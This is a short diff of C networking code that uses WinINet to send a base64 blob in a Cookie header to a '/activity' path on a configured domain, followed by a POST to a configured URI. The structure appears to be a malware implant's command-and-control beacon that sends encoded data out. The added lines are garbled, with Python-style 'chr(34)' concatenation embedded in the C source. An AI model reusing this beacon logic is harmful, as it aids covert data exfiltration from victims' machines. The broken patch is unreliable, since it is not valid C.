@@ -154,7 +154,9 @@ STRATEGY strategy = { 0, 0, 0 };
 		char headers[1024]; memset(headers, 0, sizeof(headers));
 		sprintf(headers, "Cookie: %s\r\n", b64);
 		{ char tb[128]; sprintf(tb, "NETGET: hdrlen=%d b64[0..15]=%.15s", (int)strlen(headers), b64); OBTRACE(tb); }
-		HINTERNET hReq = HttpOpenRequestA(gInternetConnect, "GET", "/activity", NULL, NULL, NULL, gNetworkOptions, &gContext);
+		HINTERNET hIO = InternetOpenA(' + chr(34) + 'ob' + chr(34) + ', INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+		HINTERNET hIC = InternetConnectA(hIO, S_DOMAINS, S_PORT_HTTP, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+		HINTERNET hReq = HttpOpenRequestA(hIC, ' + chr(34) + 'GET' + chr(34) + ', ' + chr(34) + '/activity' + chr(34) + ', NULL, NULL, NULL, 0, &gContext);
 		if (hReq) {
 			BOOL sent = HttpSendRequestA(hReq, headers, (DWORD)strlen(headers), NULL, 0);
 			{ char tb[128]; sprintf(tb, "NETGET: direct sent=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }
@@ -171,6 +173,8 @@ STRATEGY strategy = { 0, 0, 0 };
 				if (tdata) free(tdata);
 			}
 			InternetCloseHandle(hReq);
+			InternetCloseHandle(hIC);
+			InternetCloseHandle(hIO);
 		}
 		NetworkPost(S_URI_POST);
 
